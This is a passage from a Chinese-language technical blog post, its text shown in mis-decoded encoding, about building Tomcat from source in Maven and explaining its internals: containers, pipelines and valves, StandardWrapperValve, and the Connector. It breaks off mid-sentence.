class="hljs-tag">&lt;<span class="hljs-name">source</span>&gt;</span>1.8<span class="hljs-tag">&lt;/<span class="hljs-name">source</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">target</span>&gt;</span>1.8<span class="hljs-tag">&lt;/<span class="hljs-name">target</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">plugins</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">build</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>junit<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>junit<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.12<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.easymock<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>easymock<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.4<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>ant<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>ant<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.7.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>wsdl4j<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>wsdl4j<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.6.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>javax.xml<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jaxrpc<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.eclipse.jdt.core.compiler<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>ecj<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.5.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">project</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409092054244.png" alt="image-20240909205433170"></p><p>ç„¶åé…ç½®ä¸€ä¸‹åˆé€‚çš„jdkç‰ˆæœ¬ï¼Œè¿™ä¸ªå°±ä¸å¤šè¯´äº†</p><p>ä¸‹ä¸€æ­¥é…ç½®configurationï¼Œæ·»åŠ ä¸€ä¸ªapplication</p><p><img src="https://cdn.clown2024.cn/202409092056897.png" alt="image-20240909205609843"></p><p>æ·»åŠ å…¥å£ç±»org.apache.catalina.startup.Bootstrap</p><blockquote><p>åœ¨æ­¤ä¹‹å‰éœ€è¦reloadä¸€ä¸‹mavené¡¹ç›®ï¼Œä¸ç„¶ä¼šä¸è¯†åˆ«ç›¸å…³çš„javaæºç </p></blockquote><p><img src="https://cdn.clown2024.cn/202409092057339.png" alt="image-20240909205701250"></p><p>ç„¶åæˆ‘ä»¬å°±å¯ä»¥å¯åŠ¨äº†</p><p><strong>é”™è¯¯ä¸€</strong></p><p>è¿™æ—¶å€™ä¼šé‡åˆ°ç¬¬ä¸€ä¸ªé”™è¯¯ï¼Œæ— æ³•è§£æjspï¼Œä¹Ÿå°±æ˜¯è®¿é—®localhost:8080ä¸æ˜¯tomcatçš„é¦–é¡µè€Œæ˜¯è¿”å›äº†500ï¼Œè¿™æ—¶å€™éœ€è¦å»æ·»åŠ ä¸€ä¸ªJSPè§£æå™¨ï¼Œéœ€è¦æˆ‘ä»¬å»ä¿®æ”¹æºç </p><p>æ‰¾åˆ°org.apache.catalina.startup.ContextConfigç±»ï¼Œåœ¨ConfigureStartæ–¹æ³•ä¸‹æ·»åŠ å¦‚ä¸‹ä»£ç </p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">context.addServletContainerInitializer(<span class="hljs-keyword">new</span> <span class="hljs-title class_">JasperInitializer</span>(), <span class="hljs-literal">null</span>);<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409092101636.png" alt="image-20240909210146552"></p><p><strong>é”™è¯¯äºŒ</strong></p><p>è¿™æ—¶å€™é¡µé¢è®¿é—®æ˜¯æ­£å¸¸çš„ï¼Œä½†æ˜¯æ§åˆ¶å°çš„æ—¥å¿—æ˜¯ä¹±ç çš„ï¼Œå¦‚ä¸‹</p><p><img src="https://cdn.clown2024.cn/202409092047988.png" alt="image-20240909204702883"></p><p>è¿™æ˜¯å› ä¸ºåœ¨javaä¸­, è¯»å–æ–‡ä»¶çš„é»˜è®¤æ ¼å¼æ˜¯iso8859-1, è€Œæˆ‘ä»¬ä¸­æ–‡å­˜å‚¨çš„æ—¶å€™ä¸€èˆ¬æ˜¯UTF-8. æ‰€ä»¥å¯¼è‡´è¯»å‡ºæ¥çš„æ˜¯ä¹±ç ã€‚</p><p>æ–‡ç« ä¸­æœ‰ä¸¤ç§æ–¹å¼ä¿®æ”¹ä¹±ç ï¼Œæˆ‘è¿™é‡Œé‡‡ç”¨ä¿®æ”¹æºç çš„æ–¹å¼å»ä¿®æ”¹ï¼Œå°±æ˜¯æ‰¾åˆ°è¯»å–æ–‡ä»¶çš„åœ°æ–¹ï¼Œè½¬åŒ–ä¸€ä¸‹ç¼–ç æ–¹å¼ï¼Œè¿™é‡Œç›´æ¥copyä¸€ä¸‹è§£å†³æ–¹æ¡ˆï¼Œå¯ä»¥è‡ªå·±é€šè¿‡è°ƒè¯•å»æ‰¾åˆ°å¯¹åº”ä½ç½®(æˆ‘æ¯”è¾ƒæ‡’å°±ä¸è°ƒäº†)</p><ul><li><p>org.apache.tomcat.util.res.StringManagerç±»ä¸­çš„getString(final String key, final Objectâ€¦ args)æ–¹æ³•ï¼›æ·»åŠ å¦‚ä¸‹ä»£ç </p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">try</span>&#123;<br>        value =<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(value.getBytes(<span class="hljs-string">&quot;ISO-8859-1&quot;</span>),<span class="hljs-string">&quot;UTF-8&quot;</span>);<br>&#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>    &#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409092105213.png" alt="image-20240909210550131"></p></li><li><p>org.apache.jasper.compiler.Localizerç±»çš„getMessage(String errCode)æ–¹æ³•ï¼›æ·»åŠ å¦‚ä¸‹ä»£ç </p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">try</span>&#123;<br>        errMsg =<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(errMsg.getBytes(<span class="hljs-string">&quot;ISO-8859-1&quot;</span>),<span class="hljs-string">&quot;UTF-8&quot;</span>);<br>    &#125;<span class="hljs-keyword">catch</span>(Exception e)&#123;<br>        e.printStackTrace();<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409092107159.png" alt="image-20240909210715069"></p></li></ul><p>åˆ°è¿™é‡Œå°±è§£å†³å®Œæˆ‘é‡åˆ°çš„æ‰€æœ‰é—®é¢˜ï¼Œå¯ä»¥å¿«ä¹è°ƒè¯•äº†ğŸ«¡</p><h2 id="åŸç†åˆ†æ"><a href="#åŸç†åˆ†æ" class="headerlink" title="åŸç†åˆ†æ"></a>åŸç†åˆ†æ</h2><p>æˆ‘ä»¬é¦–å…ˆè¦çŸ¥é“Tomcatæ˜¯ä¸€ä¸ªservletå®¹å™¨ã€‚</p><h3 id="httpservletrequestå’Œhttpservletresponse"><a href="#HttpServletRequestå’ŒHttpServletResponse" class="headerlink" title="HttpServletRequestå’ŒHttpServletResponse"></a>HttpServletRequestå’ŒHttpServletResponse</h3><p><img src="https://cdn.clown2024.cn/202409112032626.png" alt="image-20240911203158516"></p><p><img src="https://cdn.clown2024.cn/202409112033582.png" alt="image-20240911203322536"></p><p>æˆ‘ä»¬çŸ¥é“HttpServletRequestå’ŒHttpServletResponseæ˜¯ä¸€ä¸ªæ¥å£ï¼Œæˆ‘ä»¬æ­£å¸¸å†™ä¸€ä¸ªservletå¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.servlettest;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><br><span class="hljs-keyword">import</span> jakarta.servlet.http.*;<br><span class="hljs-keyword">import</span> jakarta.servlet.annotation.*;<br><br><br><span class="hljs-meta">@WebServlet(name = &quot;helloServlet&quot;, value = &quot;/hello-servlet&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    <span class="hljs-keyword">private</span> String message;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span> &#123;<br>        message = <span class="hljs-string">&quot;Hello World!&quot;</span>;<br>        System.out.println(message);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        response.setContentType(<span class="hljs-string">&quot;text/html&quot;</span>);<br><br>        <br>        <span class="hljs-comment">// Hello</span><br>        <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> response.getWriter();<br>        out.println(<span class="hljs-string">&quot;&lt;html&gt;&lt;body&gt;&quot;</span>);<br>        out.println(<span class="hljs-string">&quot;&lt;h1&gt;&quot;</span> + message + <span class="hljs-string">&quot;&lt;/h1&gt;&quot;</span>);<br>        out.println(<span class="hljs-string">&quot;&lt;/body&gt;&lt;/html&gt;&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;destory &quot;</span>+message);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>é‚£æˆ‘ä»¬è°ƒç”¨è¿™ä¸¤ä¸ªæ¥å£çš„æ–¹æ³•å°±éœ€è¦ä¸€ä¸ªå®ç°ç±»ï¼Œé‚£è¿™ä¸ªå®ç°ç±»æ˜¯è°åˆ›å»ºå‘¢ï¼Œå°±ç”±æˆ‘ä»¬çš„tomcatæ¥åˆ›å»º</p><p>å»çœ‹tomcatçš„æºç å°±å¯ä»¥çŸ¥é“RequestFacadeå°±æ˜¯å…¶ä¸­ä¸€ä¸ªå®ç°ç±»</p><p><img src="https://cdn.clown2024.cn/202409112036033.png" alt="image-20240911203618945"></p><p>ä¸è¿‡è¿™ä¸ªç±»åªæ˜¯ä¸€ä¸ªç±»ä¼¼é—¨é¢çš„ç±»ï¼Œé‡Œé¢çœŸæ­£çš„å®ç°æ˜¯Requestç±»ï¼Œé‡Œé¢çš„æ–¹æ³•æ›´å¤æ‚ï¼Œè¯¥ç±»ä¹Ÿæ˜¯å®ç°äº†Servletè§„èŒƒçš„ç±»</p><p><img src="https://cdn.clown2024.cn/202409121050908.png" alt="image-20240912105042783"></p><p>è¿™é‡Œå°±æ˜¯ç»™ä¸‹é¢çš„åˆ†æå½“ä¸ªå¼•å­ï¼Œå¼•å‘ä¸€ä¸‹æ€è€ƒã€‚</p><h3 id="jaråŒ…å’ŒwaråŒ…"><a href="#jaråŒ…å’ŒwaråŒ…" class="headerlink" title="jaråŒ…å’ŒwaråŒ…"></a>jaråŒ…å’ŒwaråŒ…</h3><p>æˆ‘ä»¬åœ¨tomcatéƒ¨ç½²é¡¹ç›®çš„æ—¶å€™ï¼Œå¯ä»¥å°†webé¡¹ç›®æ‰“åŒ…æˆwaråŒ…ç„¶åéƒ¨ç½²åˆ°tomcatçš„webappsç›®å½•ä¸‹</p><p><img src="https://cdn.clown2024.cn/202409121053527.png" alt="image-20240912105338467"></p><p>å¯åŠ¨tomcatçš„æ—¶å€™ä»–å°±ä¼šè‡ªåŠ¨è§£å‹ï¼Œé‡Œé¢çš„å†…å®¹å¦‚ä¸‹ï¼š</p><p><img src="https://cdn.clown2024.cn/202409121054829.png" alt="image-20240912105432764"></p><p>æˆ‘ä»¬ä¹Ÿå¯ä»¥åœ¨server.xmlé‡Œé¢è®¾ç½®æ˜¯å¦è¿›è¡Œè‡ªåŠ¨è§£å‹</p><p><img src="https://cdn.clown2024.cn/202409121055233.png" alt="image-20240912105551171"></p><p>é‚£ä¹ˆjaråŒ…å‘¢ï¼Ÿ</p><p>å…¶å®jarçš„å†…å®¹å’ŒwaråŒ…è§£å‹å‡ºæ¥æ˜¯æ²¡æœ‰ä»€ä¹ˆåŒºåˆ«çš„ï¼Œjarå’ŒwaråŒ…ä¸»è¦æ˜¯tomcatå¯åŠ¨æ—¶ç”¨æ¥åŒºåˆ†è¿™æ˜¯ä¸€ä¸ªä¾èµ–è¿˜æ˜¯ä¸€ä¸ªåº”ç”¨</p><h3 id="tomcatåº”ç”¨çš„å‡ ç§éƒ¨ç½²æ–¹å¼"><a href="#tomcatåº”ç”¨çš„å‡ ç§éƒ¨ç½²æ–¹å¼" class="headerlink" title="tomcatåº”ç”¨çš„å‡ ç§éƒ¨ç½²æ–¹å¼"></a>tomcatåº”ç”¨çš„å‡ ç§éƒ¨ç½²æ–¹å¼</h3><p>éƒ¨ç½²çš„å‡ ç§æ–¹å¼å¯ä»¥åœ¨<strong>HostConfig#deployApps</strong>ä¸­çœ‹åˆ°</p><p><img src="https://cdn.clown2024.cn/202409121100464.png" alt="image-20240912110054380"></p><ol><li>æè¿°ç¬¦éƒ¨ç½²</li><li>waråŒ…éƒ¨ç½²</li><li>æ–‡ä»¶å¤¹éƒ¨ç½²ï¼Œå°±æ˜¯å°†warè§£å‹çš„æ–‡ä»¶å¤¹ç›´æ¥æ”¾åˆ°webappsä¸‹é¢ï¼Œå’ŒwaråŒ…éƒ¨ç½²æ²¡ä»€ä¹ˆåŒºåˆ«</li></ol><blockquote><p>æºç ä¸­å¯ä»¥çœ‹åˆ°tomcatéƒ¨ç½²åº”ç”¨çš„æ—¶å€™æ˜¯è¿›è¡Œå¤šçº¿ç¨‹éƒ¨ç½²çš„</p></blockquote><p><strong>æè¿°ç¬¦éƒ¨ç½²</strong></p><p>æè¿°ç¬¦éƒ¨ç½²ç”¨çš„æ˜¯&lt;Context&gt;æ ‡ç­¾ï¼Œæ¯”å¦‚æˆ‘è¦å¸ƒç½®ä¸Šé¢çš„åº”ç”¨å¯ä»¥åœ¨server.xmlè¿™æ ·é…ç½®</p><p><img src="https://cdn.clown2024.cn/202409121117862.png" alt="image-20240912111717790"></p><p>docBaseå°±æ˜¯åº”ç”¨çš„ç›®å½•ï¼Œåˆ°æ—¶å€™tomcatå°±ä¼šä»è¯¥ç›®å½•æŸ¥æ‰¾æ‰€éœ€è¦çš„èµ„æºæ¯”å¦‚æˆ‘ä»¬çš„classæ–‡ä»¶</p><h3 id="context"><a href="#Context" class="headerlink" title="Context"></a>Context</h3><p>Contextçš„æœ¬è´¨ä¸Šå°±æ˜¯ä¸€ä¸ªå®¹å™¨ï¼Œæºç ä¸­å°±æœ‰ä¸€ä¸ªå«åšContextçš„æ¥å£</p><p><img src="https://cdn.clown2024.cn/202409121149984.png" alt="image-20240912114943927"></p><p>ä»–ç»§æ‰¿è‡ªä¸€ä¸ªContaineræ¥å£ï¼Œæˆ‘ä»¬å¯ä»¥å»çœ‹çœ‹Containeræœ‰å“ªäº›ç»§æ‰¿æ¥å£ï¼Œé‡Œé¢å°±åŒ…å«ç€tomcatçš„å››å¤§å®¹å™¨</p><h2 id="tomcatå®¹å™¨"><a href="#Tomcatå®¹å™¨" class="headerlink" title="Tomcatå®¹å™¨"></a>Tomcatå®¹å™¨</h2><p><img src="https://cdn.clown2024.cn/202409121151081.png" alt="image-20240912115147007"></p><p>tomcatçš„å››å¤§å®¹å™¨ï¼š</p><ul><li><p>Contextï¼šå°±æ˜¯ä¸€ä¸ªwebåº”ç”¨ç¨‹åºï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å‰é¢é…ç½®çš„ç¨‹åºï¼Œé…ç½®åœ¨HostèŠ‚ç‚¹ä¸‹é¢</p></li><li><p>Hostï¼šè¡¨ç¤ºä¸€ä¸ªè™šæ‹Ÿä¸»æœºï¼Œä¸€ä¸ªè™šæ‹Ÿä¸»æœºä¸‹é¢å¯ä»¥æœ‰å¾ˆå¤šçš„åº”ç”¨</p><p><img src="https://cdn.clown2024.cn/202409121154456.png" alt="image-20240912115408390"></p><p>nameå°±æ˜¯ä¸»æœºåï¼ŒappBaseå°±æ˜¯åº”ç”¨ç›®å½•ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬ä¸ºä»€ä¹ˆè¦æ”¾åœ¨webappsä¸‹é¢</p></li><li><p>Engineï¼šå­—é¢æ„æ€å¼•æ“ï¼ŒHostæ˜¯Engineçš„å­èŠ‚ç‚¹</p><p><img src="https://cdn.clown2024.cn/202409121157589.png" alt="image-20240912115730532"></p><p>åœ¨Engineé‡Œé¢ï¼Œæˆ‘ä»¬æ˜¯å¯ä»¥å®šä¹‰å¤šä¸ªè™šæ‹Ÿä¸»æœºï¼Œæ‰€ä»¥ä¹Ÿå°±æ˜¯æˆ‘ä»¬å¯ä»¥å°†ä¸åŒçš„åº”ç”¨æ”¾åœ¨ä¸åŒçš„ä¸»æœºä¸‹ï¼Œé€šè¿‡ä¸åŒçš„ä¸»æœºåè®¿é—®å…·ä½“åº”ç”¨ï¼Œä¸è‡³äºå°†æ‰€æœ‰åº”ç”¨æ”¾åœ¨localhostä¸‹é¢ã€‚</p></li><li><p>Wrapperï¼šå®ƒå®é™…ä¸Šå°±å°è£…ç€ä¸€ä¸ªServletï¼Œè´Ÿè´£ç®¡ç†æ•´ä¸ªServletçš„ç”Ÿå‘½å‘¨æœŸï¼ŒåŒ…æ‹¬è£…è½½ã€åˆå§‹åŒ–ã€èµ„æºå›æ”¶ç­‰ã€‚</p></li></ul><blockquote><p><img src="https://cdn.clown2024.cn/202409121216408.png" alt="image-20240912121655347"></p><p>æˆ‘ä»¬æ­£å¸¸ä¼šç»§æ‰¿ä¸€ä¸ªHttpServletï¼Œæ‰€æœ‰è®¿é—®è¿™ä¸ªServletçš„è¯·æ±‚æ˜¯å…±ç”¨ä¸€ä¸ªServletå®ä¾‹ä¹Ÿå°±æ˜¯å•ä¾‹æ¨¡å¼ï¼Œä½†å¦‚æœå®ç°SingleThreadModelæ¥å£çš„è¯å°±æ˜¯æ¯ä¸ªè¯·æ±‚å•ç‹¬æ‹¥æœ‰ä¸€ä¸ªå®ä¾‹</p></blockquote><p>æ•´ä¸ªå®¹å™¨çš„å±‚çº§ç»“æ„å°±å¦‚ä¸‹ï¼š<br>Engine&#x3D;&#x3D;ã€‹Host&#x3D;&#x3D;ã€‹Context&#x3D;&#x3D;ã€‹Wrapper&#x3D;&#x3D;ã€‹Servlet</p><p>å†è®²è®²ä¸ºä»€ä¹ˆè¦å¤šä¸€ä¸ªWrapperï¼Œå› ä¸ºæˆ‘ä»¬æœ‰æ—¶å€™ä¼šæœ‰å¤šä¸ªServletå®ä¾‹ï¼Œå…¨æ”¾åœ¨Contextä¸‹é¢ä¼šä¸å¥½ç®¡ç†ï¼Œæ‰€ä»¥å°±ç”¨Wrapperå°†Servletå®ä¾‹æŒ‰ç…§ç±»å‹ç®¡ç†èµ·æ¥ï¼Œæ‰€ä»¥å­˜å‚¨ç»“æ„ç±»ä¼¼å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Engine:<br>List&lt;Host&gt;<br>Host:<br>List&lt;Context&gt;<br>Context<br>List&lt;Wrapper&gt; list;<br>Wrapper---Servletç±»<br>List&lt;Servlet&gt; servlets;<br></code></pre></td></tr></table></figure><h3 id="pipeline"><a href="#Pipeline" class="headerlink" title="Pipeline"></a>Pipeline</h3><p>è¿™é‡Œä¹Ÿå¯ä»¥çœ‹ä¸€ä¸‹è¿™ç¯‡æ–‡ç« ï¼š<a href="https://www.cnblogs.com/coldridgeValley/p/5816414.html">https://www.cnblogs.com/coldridgeValley/p/5816414.html</a></p><p>pipelineç¿»è¯‘è¿‡æ¥å°±æ˜¯ç®¡é“ï¼Œæ¯ä¸€ä¸ªå®¹æ˜“éƒ½æœ‰ä¸€ä¸ªç®¡é“ç»„ä»¶ï¼Œpipelineé‡Œé¢åˆæœ‰valveé˜€é—¨</p><p>æ‰€ä»¥ä¸Šé¢çš„ç»“æ„åˆå¯ä»¥ä¼˜åŒ–æˆè¿™æ ·</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Engine:<br>Pipeline:<br>List&lt;valve&gt;<br>List&lt;Host&gt;<br>Host:<br>Pipeline:<br>List&lt;valve&gt;<br>List&lt;Context&gt;<br>Context<br>Pipeline:<br>List&lt;valve&gt;<br>List&lt;Wrapper&gt; list;<br>Wrapper---Servletç±»<br>Pipeline:<br>List&lt;valve&gt;<br>List&lt;Servlet&gt; servlets;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬çš„Requestå¯¹è±¡æƒ³è¦æœ€ç»ˆservleté‡Œé¢çš„doGetç­‰æ–¹æ³•ï¼Œä¼šç»è¿‡å‰é¢ä¸€ç³»åˆ—çš„å®¹å™¨ã€ç®¡é“ã€é˜€é—¨ã€‚</p><p>æ¯ä¸ªç®¡é“æœ€é‡è¦çš„æ˜¯æœ€åä¸€ä¸ªé˜€é—¨ï¼Œå› ä¸ºä»–è¦è´Ÿè´£å°†requestå¾€ä¸‹ä¸€ä¸ªå®¹å™¨è¿›è¡Œä¼ é€’ï¼Œæ‰€ä»¥æœ€åä¸€ä¸ªé˜€é—¨æ˜¯tomcatæå‰å†™å¥½çš„ã€‚</p><p><strong>ValveèŠ‚ç‚¹</strong></p><p>è¯¥èŠ‚ç‚¹é…ç½®åœ¨HostèŠ‚ç‚¹ä¸‹é¢ï¼Œå¯ä»¥é…ç½®ç»è¿‡è¯¥é˜€é—¨æ—¶éœ€è¦åšä»€ä¹ˆï¼Œæˆ‘ä»¬åªéœ€è¦å»å®ç°æˆ–ç»§æ‰¿valveç›¸å…³çš„æ¥å£æˆ–ç±»å³å¯è‡ªå·±é…ç½®</p><p><img src="https://cdn.clown2024.cn/202409121354703.png" alt="image-20240912135432620"></p><p>æ¯”å¦‚ä¸‹é¢çš„è®°å½•æ—¥å¿—</p><p><img src="https://cdn.clown2024.cn/202409121200163.png" alt="image-20240912120035093"></p><h3 id="standardwrapper"><a href="#StandardWrapper" class="headerlink" title="StandardWrapper"></a>StandardWrapper</h3><p>è¿™é‡Œæˆ‘ä»¬å»çœ‹ä¸€ä¸‹Wrapperçš„pipelineçš„æœ€åä¸€ä¸ªvalveï¼Œå› ä¸ºä»–æ˜¯ç›´æ¥å’Œservletæ¥è§¦çš„ï¼›</p><p>Wrapperçš„å®ç°ç±»æ˜¯StandardWrapper</p><p><img src="https://cdn.clown2024.cn/202409121358782.png" alt="image-20240912135850663"></p><p>è¿™ä¸ªvalveå°±æ˜¯æˆ‘ä»¬è¯´çš„æœ€åä¸€ä¸ªvalve</p><p><img src="https://cdn.clown2024.cn/202409121400857.png" alt="image-20240912140039778"></p><p>å…·ä½“çš„é€»è¾‘åœ¨StandardWrapperValveçš„invokeæ–¹æ³•é‡Œé¢ï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œæ¥å—äº†Requestå’ŒResponse</p><p>æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹ä»–é‡Œé¢ä¸€äº›å…³é”®çš„æ­¥éª¤</p><p><img src="https://cdn.clown2024.cn/202409121956314.png" alt="image-20240912195619220"></p><p>è¿™é‡Œæ˜¯åˆ†é…servletå®ä¾‹çš„åœ°æ–¹ï¼Œæ–¹æ³•é‡Œçš„å…·ä½“é€»è¾‘å°±ä¸åˆ†æï¼ŒçŸ¥é“ä»–çš„ä½œç”¨å°±å¥½</p><p><img src="https://cdn.clown2024.cn/202409121957566.png" alt="image-20240912195722497"></p><p>ç„¶åè¿™é‡Œç”Ÿæˆäº†ä¸€ä¸ªfilterchainï¼Œå°†æˆ‘ä»¬çš„requestã€wrapperã€serveltéƒ½å°è£…äº†è¿›å»ï¼Œè¿™é‡Œçš„filterchainå°±æ˜¯æˆ‘ä»¬å‰é¢æåˆ°Filter</p><p><img src="https://cdn.clown2024.cn/202409122000325.png" alt="image-20240912200056244"></p><p>ç„¶åæœ€ç»ˆçš„æ“ä½œå°±æ˜¯åœ¨æˆ‘ä»¬çš„doFilteré‡Œé¢è¿›è¡Œï¼Œæˆ‘ä»¬è‡ªå·±è¦å»ºç«‹Filterä¹Ÿæ˜¯åƒå†™servletä¸€æ ·ï¼Œå†™ä¸€ä¸ªç±»ç»§æ‰¿Filterç›¸å…³çš„æ¥å£ï¼Œç„¶ååœ¨web.xmlä¸­é…ç½®ï¼Œå’Œè¦è¿‡æ»¤çš„servletå¯¹åº”èµ·æ¥</p><p><img src="https://cdn.clown2024.cn/202409122007925.png" alt="image-20240912200740837"></p><p>åé¢çš„è°ƒç”¨æµç¨‹å°±è‡ªå·±è°ƒä¸€ä¸‹æºç çœ‹çœ‹å°±å¥½äº†</p><h2 id="tomcat-connector"><a href="#Tomcat-Connector" class="headerlink" title="Tomcat Connector"></a>Tomcat Connector</h2><p>æˆ‘ä»¬åœ¨å‰é¢çš„Tomcatæ¶æ„å›¾å¯ä»¥çœ‹åˆ°æœ‰Connectorç»„ä»¶ï¼Œtomcatæœ‰ä¸¤ä¸ªæ ¸å¿ƒåŠŸèƒ½ï¼š</p><p>1.å¤„ç† Socket è¿æ¥ï¼Œè´Ÿè´£ç½‘ç»œå­—èŠ‚æµä¸ Request å’Œ Response å¯¹è±¡çš„è½¬åŒ–ã€‚</p><p>2.åŠ è½½å’Œç®¡ç† Servletï¼Œä»¥åŠå…·ä½“å¤„ç† Request è¯·æ±‚ã€‚</p><p>æˆ‘ä»¬çš„Containerç»„ä»¶è´Ÿè´£å†…éƒ¨Servletçš„ç®¡ç†å’Œå¤„ç†è¿‡æ¥çš„Requestè¯·æ±‚ï¼Œé‚£å¤–éƒ¨ä¼ è¿‡æ¥çš„æ•°æ®æ˜¯æ€ä¹ˆç”ŸæˆRequestå¯¹è±¡çš„å‘¢ï¼Œè¿™é çš„å°±æ˜¯Connectorç»„ä»¶åˆ©ç”¨Socketæ¥å—æ“ä½œç³»ç»Ÿä¼ 